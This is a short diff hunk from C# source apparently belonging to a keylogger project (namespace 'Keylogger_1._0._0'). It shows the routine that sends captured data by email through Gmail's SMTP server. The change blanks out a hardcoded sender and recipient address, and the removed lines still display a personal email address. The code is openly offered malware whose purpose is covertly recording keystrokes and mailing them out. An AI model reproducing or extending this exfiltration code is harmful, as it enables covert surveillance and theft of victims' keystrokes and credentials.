@@ -113,8 +113,8 @@ namespace Keylogger_1._0._0
             SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
             MailMessage mailMessage = new MailMessage();
 
-            mailMessage.From = new MailAddress("jameslopezthebigone@gmail.com");
-            mailMessage.To.Add("jameslopezthebigone@gmail.com");
+            mailMessage.From = new MailAddress(""); // removed personal information upload add email
+            mailMessage.To.Add(""); // removed personal information upload add email
             mailMessage.Subject = subject;
             client.UseDefaultCredentials = false;
             client.EnableSsl = true;
